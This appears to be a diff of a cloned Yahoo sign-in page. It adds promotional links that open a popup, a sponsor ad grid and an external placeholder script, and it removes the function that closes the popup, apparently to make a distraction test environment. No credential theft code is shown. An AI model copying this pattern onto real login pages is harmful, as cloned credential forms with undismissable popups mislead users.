+         </option>
+         <option data-code="+235" role="option" value="TD">
+          Chad ‪(+235)‬
+         </option>
+         <option data-code="+56" role="option" value="CL">
+          Chile ‪(+56)‬
+         </option>
+         <option data-code="+86" role="option" value="CN">
+          China ‪(+86)‬
+         </option>
+         <option data-code="+57" role="option" value="CO">
+          Colombia ‪(+57)‬
+         </option>
+         <option data-code="+269" role="option" value="KM">
+          Comoros ‪(+269)‬
+         </option>
+         <option data-code="+242" role="option" value="CG">
+          Congo ‪(+242)‬
+         </option>
+         <option data-code="+682" role="option" value="CK">
+          Cook Islands ‪(+682)‬
+         </option>
+         <option data-code="+506" role="option" value="CR">
+          Costa Rica ‪(+506)‬
+         </option>
+         <option data-code="+225" role="option" value="CI">
+          Cote dÕIvoire ‪(+225)‬
+         </option>
+         <option data-code="+385" role="option" value="HR">
+          Croatia ‪(+385)‬
+         </option>
+         <option data-code="+53" role="option" value="CU">
+          Cuba ‪(+53)‬
+         </option>
+         <option data-code="+357" role="option" value="CY">
+          Cyprus ‪(+357)‬
+         </option>
+         <option data-code="+420" role="option" value="CZ">
+          Czech Republic ‪(+420)‬
+         </option>
+         <option data-code="+243" role="option" value="CD">
+          Democratic Republic of the Congo ‪(+243)‬
+         </option>
+         <option data-code="+45" role="option" value="DK">
+          Denmark ‪(+45)‬
+         </option>
+         <option data-code="+246" role="option" value="DG">
+          Diego Garcia ‪(+246)‬
+         </option>
+         <option data-code="+253" role="option" value="DJ">
+          Djibouti ‪(+253)‬
+         </option>
+         <option data-code="+1" role="option" value="DM">
+          Dominica ‪(+1)‬
+         </option>
+         <option data-code="+1" role="option" value="DO">
+          Dominican Republic ‪(+1)‬
+         </option>
+         <option data-code="+670" role="option" value="TL">
+          East Timor ‪(+670)‬
+         </option>
+         <option data-code="+593" role="option" value="EC">
+          Ecuador ‪(+593)‬
+         </option>
+         <option data-code="+20" role="option" value="EG">
+          Egypt ‪(+20)‬
+         </option>
+         <option data-code="+503" role="option" value="SV">
+          El Salvador ‪(+503)‬
+         </option>
+         <option data-code="+240" role="option" value="GQ">
+          Equatorial Guinea ‪(+240)‬
+         </option>
+         <option data-code="+291" role="option" value="ER">
+          Eritrea ‪(+291)‬
+         </option>
+         <option data-code="+372" role="option" value="EE">
+          Estonia ‪(+372)‬
+         </option>
+         <option data-code="+251" role="option" value="ET">
+          Ethiopia ‪(+251)‬
+         </option>
+         <option data-code="+500" role="option" value="FK">
+          Falkland Islands ‪(+500)‬
+         </option>
+         <option data-code="+298" role="option" value="FO">
+          Faroe Islands ‪(+298)‬
+         </option>
+         <option data-code="+679" role="option" value="FJ">
+          Fiji ‪(+679)‬
+         </option>
+         <option data-code="+358" role="option" value="FI">
+          Finland ‪(+358)‬
+         </option>
+         <option data-code="+33" role="option" value="FR">
+          France ‪(+33)‬
+         </option>
+         <option data-code="+594" role="option" value="GF">
+          French Guiana ‪(+594)‬
+         </option>
+         <option data-code="+689" role="option" value="PF">
+          French Polynesia ‪(+689)‬
+         </option>
+         <option data-code="+241" role="option" value="GA">
+          Gabon ‪(+241)‬
+         </option>
+         <option data-code="+220" role="option" value="GM">
+          Gambia ‪(+220)‬
+         </option>
+         <option data-code="+995" role="option" value="GE">
+          Georgia ‪(+995)‬
+         </option>
+         <option data-code="+49" role="option" value="DE">
+          Germany ‪(+49)‬
+         </option>
+         <option data-code="+233" role="option" value="GH">
+          Ghana ‪(+233)‬
+         </option>
+         <option data-code="+350" role="option" value="GI">
+          Gibraltar ‪(+350)‬
+         </option>
+         <option data-code="+30" role="option" value="GR">
+          Greece ‪(+30)‬
+         </option>
+         <option data-code="+299" role="option" value="GL">
+          Greenland ‪(+299)‬
+         </option>
+         <option data-code="+1" role="option" value="GD">
+          Grenada ‪(+1)‬
+         </option>
+         <option data-code="+590" role="option" value="GP">
+          Guadeloupe ‪(+590)‬
+         </option>
+         <option data-code="+1" role="option" value="GU">
+          Guam ‪(+1)‬
+         </option>
+         <option data-code="+502" role="option" value="GT">
+          Guatemala ‪(+502)‬
+         </option>
+         <option data-code="+224" role="option" value="GN">
+          Guinea ‪(+224)‬
+         </option>
+         <option data-code="+245" role="option" value="GW">
+          ‪(+245)‬
+         </option>
+         <option data-code="+592" role="option" value="GY">
+          Guyana ‪(+592)‬
+         </option>
+         <option data-code="+509" role="option" value="HT">
+          Haiti ‪(+509)‬
+         </option>
+         <option data-code="+504" role="option" value="HN">
+          Honduras ‪(+504)‬
+         </option>
+         <option data-code="+852" role="option" value="HK">
+          Hong Kong ‪(+852)‬
+         </option>
+         <option data-code="+36" role="option" value="HU">
+          Hungary ‪(+36)‬
+         </option>
+         <option data-code="+354" role="option" value="IS">
+          Iceland ‪(+354)‬
+         </option>
+         <option data-code="+91" role="option" selected="selected" value="IN">
+          India ‪(+91)‬
+         </option>
+         <option data-code="+62" role="option" value="ID">
+          Indonesia ‪(+62)‬
+         </option>
+         <option data-code="+98" role="option" value="IR">
+          Iran ‪(+98)‬
+         </option>
+         <option data-code="+964" role="option" value="IQ">
+          Iraq ‪(+964)‬
+         </option>
+         <option data-code="+353" role="option" value="IE">
+          Ireland ‪(+353)‬
+         </option>
+         <option data-code="+972" role="option" value="IL">
+          Israel ‪(+972)‬
+         </option>
+         <option data-code="+39" role="option" value="IT">
+          Italy ‪(+39)‬
+         </option>
+         <option data-code="+1" role="option" value="JM">
+          Jamaica ‪(+1)‬
+         </option>
+         <option data-code="+81" role="option" value="JP">
+          Japan ‪(+81)‬
+         </option>
+         <option data-code="+962" role="option" value="JO">
+          Jordan ‪(+962)‬
+         </option>
+         <option data-code="+7" role="option" value="KZ">
+          Kazakhstan ‪(+7)‬
+         </option>
+         <option data-code="+254" role="option" value="KE">
+          Kenya ‪(+254)‬
+         </option>
+         <option data-code="+686" role="option" value="KI">
+          Kiribati ‪(+686)‬
+         </option>
+         <option data-code="+383" role="option" value="XK">
+          ‪(+383)‬
+         </option>
+         <option data-code="+965" role="option" value="KW">
+          Kuwait ‪(+965)‬
+         </option>
+         <option data-code="+996" role="option" value="KG">
+          Kyrgyzstan ‪(+996)‬
+         </option>
+         <option data-code="+856" role="option" value="LA">
+          Laos ‪(+856)‬
+         </option>
+         <option data-code="+371" role="option" value="LV">
+          Latvia ‪(+371)‬
+         </option>
+         <option data-code="+961" role="option" value="LB">
+          Lebanon ‪(+961)‬
+         </option>
+         <option data-code="+266" role="option" value="LS">
+          Lesotho ‪(+266)‬
+         </option>
+         <option data-code="+231" role="option" value="LR">
+          Liberia ‪(+231)‬
+         </option>
+         <option data-code="+218" role="option" value="LY">
+          Libya ‪(+218)‬
+         </option>
+         <option data-code="+423" role="option" value="LI">
+          Liechtenstein ‪(+423)‬
+         </option>
+         <option data-code="+370" role="option" value="LT">
+          Lithuania ‪(+370)‬
+         </option>
+         <option data-code="+352" role="option" value="LU">
+          Luxembourg ‪(+352)‬
+         </option>
+         <option data-code="+853" role="option" value="MO">
+          Macao ‪(+853)‬
+         </option>
+         <option data-code="+389" role="option" value="MK">
+          Macedonia ‪(+389)‬
+         </option>
+         <option data-code="+261" role="option" value="MG">
+          Madagascar ‪(+261)‬
+         </option>
+         <option data-code="+265" role="option" value="MW">
+          Malawi ‪(+265)‬
+         </option>
+         <option data-code="+60" role="option" value="MY">
+          Malaysia ‪(+60)‬
+         </option>
+         <option data-code="+960" role="option" value="MV">
+          Maldives ‪(+960)‬
+         </option>
+         <option data-code="+223" role="option" value="ML">
+          Mali ‪(+223)‬
+         </option>
+         <option data-code="+356" role="option" value="MT">
+          Malta ‪(+356)‬
+         </option>
+         <option data-code="+692" role="option" value="MH">
+          Marshall Islands ‪(+692)‬
+         </option>
+         <option data-code="+596" role="option" value="MQ">
+          Martinique ‪(+596)‬
+         </option>
+         <option data-code="+222" role="option" value="MR">
+          Mauritania ‪(+222)‬
+         </option>
+         <option data-code="+230" role="option" value="MU">
+          Mauritius ‪(+230)‬
+         </option>
+         <option data-code="+52" role="option" value="MX">
+          Mexico ‪(+52)‬
+         </option>
+         <option data-code="+691" role="option" value="FM">
+          Micronesia ‪(+691)‬
+         </option>
+         <option data-code="+373" role="option" value="MD">
+          Moldova ‪(+373)‬
+         </option>
+         <option data-code="+377" role="option" value="MC">
+          Monaco ‪(+377)‬
+         </option>
+         <option data-code="+976" role="option" value="MN">
+          Mongolia ‪(+976)‬
+         </option>
+         <option data-code="+382" role="option" value="ME">
+          Montenegro ‪(+382)‬
+         </option>
+         <option data-code="+1" role="option" value="MS">
+          Montserrat ‪(+1)‬
+         </option>
+         <option data-code="+212" role="option" value="MA">
+          Morocco ‪(+212)‬
+         </option>
+         <option data-code="+258" role="option" value="MZ">
+          Mozambique ‪(+258)‬
+         </option>
+         <option data-code="+95" role="option" value="MM">
+          Myanmar ‪(+95)‬
+         </option>
+         <option data-code="+264" role="option" value="NA">
+          Namibia ‪(+264)‬
+         </option>
+         <option data-code="+674" role="option" value="NR">
+          Nauru ‪(+674)‬
+         </option>
+         <option data-code="+977" role="option" value="NP">
+          Nepal ‪(+977)‬
+         </option>
+         <option data-code="+31" role="option" value="NL">
+          Netherlands ‪(+31)‬
+         </option>
+         <option data-code="+599" role="option" value="AN">
+          ‪(+599)‬
+         </option>
+         <option data-code="+687" role="option" value="NC">
+          New Caledonia ‪(+687)‬
+         </option>
+         <option data-code="+64" role="option" value="NZ">
+          New Zealand ‪(+64)‬
+         </option>
+         <option data-code="+505" role="option" value="NI">
+          Nicaragua ‪(+505)‬
+         </option>
+         <option data-code="+227" role="option" value="NE">
+          Niger ‪(+227)‬
+         </option>
+         <option data-code="+234" role="option" value="NG">
+          Nigeria ‪(+234)‬
+         </option>
+         <option data-code="+683" role="option" value="NU">
+          Niue ‪(+683)‬
+         </option>
+         <option data-code="+850" role="option" value="KP">
+          North Korea ‪(+850)‬
+         </option>
+         <option data-code="+1" role="option" value="MP">
+          Northern Mariana Islands ‪(+1)‬
+         </option>
+         <option data-code="+47" role="option" value="NO">
+          Norway ‪(+47)‬
+         </option>
+         <option data-code="+968" role="option" value="OM">
+          Oman ‪(+968)‬
+         </option>
+         <option data-code="+92" role="option" value="PK">
+          Pakistan ‪(+92)‬
+         </option>
+         <option data-code="+680" role="option" value="PW">
+          Palau ‪(+680)‬
+         </option>
+         <option data-code="+970" role="option" value="PS">
+          Palestine ‪(+970)‬
+         </option>
+         <option data-code="+507" role="option" value="PA">
+          Panama ‪(+507)‬
+         </option>
+         <option data-code="+675" role="option" value="PG">
+          Papua New Guinea ‪(+675)‬
+         </option>
+         <option data-code="+595" role="option" value="PY">
+          Paraguay ‪(+595)‬
+         </option>
+         <option data-code="+51" role="option" value="PE">
+          Peru ‪(+51)‬
+         </option>
+         <option data-code="+63" role="option" value="PH">
+          Philippines ‪(+63)‬
+         </option>
+         <option data-code="+48" role="option" value="PL">
+          Poland ‪(+48)‬
+         </option>
+         <option data-code="+351" role="option" value="PT">
+          Portugal ‪(+351)‬
+         </option>
+         <option data-code="+1" role="option" value="PR">
+          Puerto Rico ‪(+1)‬
+         </option>
+         <option data-code="+974" role="option" value="QA">
+          Qatar ‪(+974)‬
+         </option>
+         <option data-code="+262" role="option" value="RE">
+          Reunion ‪(+262)‬
+         </option>
+         <option data-code="+40" role="option" value="RO">
+          Romania ‪(+40)‬
+         </option>
+         <option data-code="+7" role="option" value="RU">
+          Russia ‪(+7)‬
+         </option>
+         <option data-code="+250" role="option" value="RW">
+          Rwanda ‪(+250)‬
+         </option>
+         <option data-code="+290" role="option" value="SH">
+          Saint Helena ‪(+290)‬
+         </option>
+         <option data-code="+1" role="option" value="KN">
+          Saint Kitts and Nevis ‪(+1)‬
+         </option>
+         <option data-code="+1" role="option" value="LC">
+          Saint Lucia ‪(+1)‬
+         </option>
+         <option data-code="+508" role="option" value="PM">
+          Saint Pierre and Miquelon ‪(+508)‬
+         </option>
+         <option data-code="+1" role="option" value="VC">
+          Saint Vincent and Grenadines ‪(+1)‬
+         </option>
+         <option data-code="+685" role="option" value="WS">
+          Samoa ‪(+685)‬
+         </option>
+         <option data-code="+378" role="option" value="SM">
+          San Marino ‪(+378)‬
+         </option>
+         <option data-code="+239" role="option" value="ST">
+          Sao Tome and Principe ‪(+239)‬
+         </option>
+         <option data-code="+966" role="option" value="SA">
+          Saudi Arabia ‪(+966)‬
+         </option>
+         <option data-code="+221" role="option" value="SN">
+          Senegal ‪(+221)‬
+         </option>
+         <option data-code="+381" role="option" value="RS">
+          Serbia ‪(+381)‬
+         </option>
+         <option data-code="+248" role="option" value="SC">
+          Seychelles ‪(+248)‬
+         </option>
+         <option data-code="+232" role="option" value="SL">
+          Sierra Leone ‪(+232)‬
+         </option>
+         <option data-code="+65" role="option" value="SG">
+          Singapore ‪(+65)‬
+         </option>
+         <option data-code="+421" role="option" value="SK">
+          Slovakia ‪(+421)‬
+         </option>
+         <option data-code="+386" role="option" value="SI">
+          Slovenia ‪(+386)‬
+         </option>
+         <option data-code="+677" role="option" value="SB">
+          Solomon Islands ‪(+677)‬
+         </option>
+         <option data-code="+252" role="option" value="SO">
+          Somalia ‪(+252)‬
+         </option>
+         <option data-code="+27" role="option" value="ZA">
+          South Africa ‪(+27)‬
+         </option>
+         <option data-code="+82" role="option" value="KR">
+          South Korea ‪(+82)‬
+         </option>
+         <option data-code="+34" role="option" value="ES">
+          Spain ‪(+34)‬
+         </option>
+         <option data-code="+94" role="option" value="LK">
+          Sri Lanka ‪(+94)‬
+         </option>
+         <option data-code="+249" role="option" value="SD">
+          Sudan ‪(+249)‬
+         </option>
+         <option data-code="+597" role="option" value="SR">
+          Suriname ‪(+597)‬
+         </option>
+         <option data-code="+268" role="option" value="SZ">
+          Swaziland ‪(+268)‬
+         </option>
+         <option data-code="+46" role="option" value="SE">
+          Sweden ‪(+46)‬
+         </option>
+         <option data-code="+41" role="option" value="CH">
+          Switzerland ‪(+41)‬
+         </option>
+         <option data-code="+963" role="option" value="SY">
+          Syria ‪(+963)‬
+         </option>
+         <option data-code="+886" role="option" value="TW">
+          Taiwan ‪(+886)‬
+         </option>
+         <option data-code="+992" role="option" value="TJ">
+          Tajikistan ‪(+992)‬
+         </option>
+         <option data-code="+255" role="option" value="TZ">
+          Tanzania ‪(+255)‬
+         </option>
+         <option data-code="+66" role="option" value="TH">
+          Thailand ‪(+66)‬
+         </option>
+         <option data-code="+228" role="option" value="TG">
+          Togo ‪(+228)‬
+         </option>
+         <option data-code="+690" role="option" value="TK">
+          Tokelau ‪(+690)‬
+         </option>
+         <option data-code="+676" role="option" value="TO">
+          Tonga ‪(+676)‬
+         </option>
+         <option data-code="+1" role="option" value="TT">
+          Trinidad and Tobago ‪(+1)‬
+         </option>
+         <option data-code="+216" role="option" value="TN">
+          Tunisia ‪(+216)‬
+         </option>
+         <option data-code="+90" role="option" value="TR">
+          Turkey ‪(+90)‬
+         </option>
+         <option data-code="+993" role="option" value="TM">
+          Turkmenistan ‪(+993)‬
+         </option>
+         <option data-code="+1" role="option" value="TC">
+          Turks and Caicos Islands ‪(+1)‬
+         </option>
+         <option data-code="+688" role="option" value="TV">
+          Tuvalu ‪(+688)‬
+         </option>
+         <option data-code="+1" role="option" value="VI">
+          US Virgin Islands ‪(+1)‬
+         </option>
+         <option data-code="+256" role="option" value="UG">
+          Uganda ‪(+256)‬
+         </option>
+         <option data-code="+380" role="option" value="UA">
+          Ukraine ‪(+380)‬
+         </option>
+         <option data-code="+971" role="option" value="AE">
+          United Arab Emirates ‪(+971)‬
+         </option>
+         <option data-code="+44" role="option" value="GB">
+          United Kingdom ‪(+44)‬
+         </option>
+         <option data-code="+1" data-format="(XXX) XXX-XXXX" role="option" value="US">
+          United States ‪(+1)‬
+         </option>
+         <option data-code="+598" role="option" value="UY">
+          Uruguay ‪(+598)‬
+         </option>
+         <option data-code="+998" role="option" value="UZ">
+          Uzbekistan ‪(+998)‬
+         </option>
+         <option data-code="+678" role="option" value="VU">
+          Vanuatu ‪(+678)‬
+         </option>
+         <option data-code="+379" role="option" value="VA">
+          Vatican City ‪(+379)‬
+         </option>
+         <option data-code="+58" role="option" value="VE">
+          Venezuela ‪(+58)‬
+         </option>
+         <option data-code="+84" role="option" value="VN">
+          Vietnam ‪(+84)‬
+         </option>
+         <option data-code="+681" role="option" value="WF">
+          Wallis and Futuna ‪(+681)‬
+         </option>
+         <option data-code="+967" role="option" value="YE">
+          Yemen ‪(+967)‬
+         </option>
+         <option data-code="+260" role="option" value="ZM">
+          Zambia ‪(+260)‬
+         </option>
+         <option data-code="+263" role="option" value="ZW">
+          Zimbabwe ‪(+263)‬
+         </option>
+        </select>
+        <div class="arrow">
+        </div>
        </div>
       </div>
-     </div>
-     <div class="input-group">
-      <input autocapitalize="none" autocomplete="username" autocorrect="off" autofocus="true" class="phone-no" id="login-username" name="username" placeholder=" " type="text" value=""/>
-      <div class="input-field-icon hide" id="username-field-icon">
-      </div>
-      <label class="login-label" for="login-username" id="login-label">
-       Username, email, or mobile
-      </label>
-      <ul aria-live="polite" class="auto-fill-overlay hide" id="domain-auto-fill">
-       <li data-fill="yahoo.com" tabindex="2">
-        yahoo.com
-       </li>
-       <li data-fill="gmail.com" tabindex="3">
-        gmail.com
-       </li>
-       <li data-fill="outlook.com" tabindex="4">
-        outlook.com
-       </li>
-       <li data-fill="aol.com" tabindex="5">
-        aol.com
-       </li>
-      </ul>
-     </div>
-     <div class="hidden-input-container">
-      <input aria-hidden="true" autocorrect="off" class="pwd-field" name="passwd" placeholder="Password" role="presentation" tabindex="-1" type="password"/>
-     </div>
-    </div>
-    <p class="error-msg hide" id="username-error" role="alert">
-    </p>
-    <div class="button-container">
-     <input class="pure-button puree-button-primary challenge-button" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next" id="login-signin" name="signin" type="submit" value="Next"/>
-    </div>
-    <div class="helper-links-container">
-     <div class="helper-item">
-      <span class="stay-signed-in checkbox-container">
-       <input checked="" id="persistent" name="persistent" type="checkbox" value="y"/>
-       <label for="persistent">
-        Stay signed in
+      <div class="input-group">
+       <input autocapitalize="none" autocomplete="username" autocorrect="off" autofocus="true" class="phone-no" id="login-username" name="username" placeholder=" " type="text" value=""/>
+       <div class="input-field-icon hide" id="username-field-icon">
+       </div>
+       <label class="login-label" for="login-username" id="login-label">
+        Username, email, or mobile
        </label>
-      </span>
-     </div>
-     <div class="helper-item arlink">
-      <span class="help">
-       <a data-rapid-tracking="true" data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:forgot" href="https://login.yahoo.com/forgot?done=https%3A%2F%2Fwww.yahoo.com" id="mbr-forgot-link">
-        Forgot username?
-       </a>
-      </span>
-     </div>
-    </div>
-    <div class="bottom-links-container has-social-buttons">
-     <p class="sign-up-link">
-      <a class="pure-button puree-button-secondary challenge-button" data-rapid-tracking="true" data-ylk="elm:link;elmt:secondary;slk:signup;mKey:signup" href="account/create@specId=yidregsimplified&amp;done=https%253A%252F%252Fwww.yahoo.com" id="createacc" role="button">
-       Create an account
-      </a>
-     </p>
-     <div class="social-login-container" id="social-login-container">
-      <div class="or-cont-with-desc challenge-feedback-text">
-       Or, continue with
+       <ul aria-live="polite" class="auto-fill-overlay hide" id="domain-auto-fill">
+        <li data-fill="yahoo.com" tabindex="2">
+         yahoo.com
+        </li>
+        <li data-fill="gmail.com" tabindex="3">
+         gmail.com
+        </li>
+        <li data-fill="outlook.com" tabindex="4">
+         outlook.com
+        </li>
+        <li data-fill="aol.com" tabindex="5">
+         aol.com
+        </li>
+       </ul>
       </div>
-      <ul class="social-login">
-       <li class="items-cont-1">
-        <button class="pure-button sc-button items-1 sc-google sc-google-button" data-rapid-tracking="true" data-ylk="elm:btn;slk:google-btn;mKey:google-social-btn" id="tpa-google-button" name="tpaProvider" type="submit" value="google">
-         <label class="offscreen">
-          google
-         </label>
-        </button>
-       </li>
-      </ul>
+      <div class="hidden-input-container">
+       <input aria-hidden="true" autocorrect="off" class="pwd-field" name="passwd" placeholder="Password" role="presentation" tabindex="-1" type="password"/>
+      </div>
      </div>
-    </div>
-   </form>
+     <p class="error-msg hide" id="username-error" role="alert">
+     </p>
+     <div class="button-container">
+      <input class="pure-button puree-button-primary challenge-button" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next" id="login-signin" name="signin" type="submit" value="Next"/>
+     </div>
+     <div class="helper-links-container">
+      <div class="helper-item">
+       <span class="stay-signed-in checkbox-container">
+        <input checked="" id="persistent" name="persistent" type="checkbox" value="y"/>
+        <label for="persistent">
+         Stay signed in
+        </label>
+       </span>
+      </div>
+      <div class="helper-item arlink">
+       <span class="help">
+        <a data-rapid-tracking="true" data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:forgot" href="https://login.yahoo.com/forgot?done=https%3A%2F%2Fwww.yahoo.com" id="mbr-forgot-link">
+         Forgot username?
+        </a>
+       </span>
+      </div>
+     </div>
+     <div class="bottom-links-container has-social-buttons">
+      <p class="sign-up-link">
+       <a class="pure-button puree-button-secondary challenge-button" data-rapid-tracking="true" data-ylk="elm:link;elmt:secondary;slk:signup;mKey:signup" href="account/create@specId=yidregsimplified&amp;done=https%253A%252F%252Fwww.yahoo.com" id="createacc" role="button">
+        Create an account
+       </a>
+      </p>
+      <div class="social-login-container" id="social-login-container">
+       <div class="or-cont-with-desc challenge-feedback-text">
+        Or, continue with
+       </div>
+       <ul class="social-login">
+        <li class="items-cont-1">
+         <button class="pure-button sc-button items-1 sc-google sc-google-button" data-rapid-tracking="true" data-ylk="elm:btn;slk:google-btn;mKey:google-social-btn" id="tpa-google-button" name="tpaProvider" type="submit" value="google">
+          <label class="offscreen">
+           google
+          </label>
+         </button>
+        </li>
+       </ul>
+      </div>
+     </div>
+    </form>
+   </div>
   </div>
   <script>
    function showPopup() {
             document.getElementById('popup').style.display = 'block';
-        }
-
-        function hidePopup() {
-            document.getElementById('popup').style.display = 'none';
         }
 
         function handleSubmit(event) {
@@ -1812,6 +1857,42 @@ root.isIOSDevice = false;
             }
         });
   </script>
+  <div class="new-elements-container">
+   <script src="https://example.com/script.js">
+   </script>
+   <link href="https://example.com/styles.css" rel="stylesheet"/>
+   <div class="appealing-section">
+    <h2>
+     Explore Our Features
+    </h2>
+    <a class="new-div-0" href="#" onclick="showPopup()" style="display: block; margin-bottom: 10px;">
+     Unlock new opportunities today!
+    </a>
+    <a class="new-div-1" href="#" onclick="showPopup()" style="display: block; margin-bottom: 10px;">
+     Stay ahead with the latest updates.
+    </a>
+    <a class="new-div-2" href="#" onclick="showPopup()" style="display: block; margin-bottom: 10px;">
+     Discover the power of innovation.
+    </a>
+    <a class="new-div-3" href="#" onclick="showPopup()" style="display: block; margin-bottom: 10px;">
+     Join our community and grow with us.
+    </a>
+    <a class="new-div-4" href="#" onclick="showPopup()" style="display: block; margin-bottom: 10px;">
+     Experience the future of technology.
+    </a>
+   </div>
+   <div class="grid-section">
+    <h2>
+     Our Sponsors
+    </h2>
+    <div class="grid-container">
+     <img alt="Advertisement Image" class="grid-item" src="../advertisement_images/amazon_advertisement.png"/>
+     <img alt="Advertisement Image" class="grid-item" src="../advertisement_images/myntra_advertisement.png"/>
+     <img alt="Advertisement Image" class="grid-item" src="../advertisement_images/flipkart_advertisement.png"/>
+     <img alt="Advertisement Image" class="grid-item" src="../advertisement_images/zoodio.png"/>
+    </div>
+   </div>
+  </div>
  </body>
 </html>
 <!-- fe12.member.sg3.yahoo.com - Wed May 29 2024 07:10:10 GMT+0000 (Coordinated Universal Time) - (0ms) -->
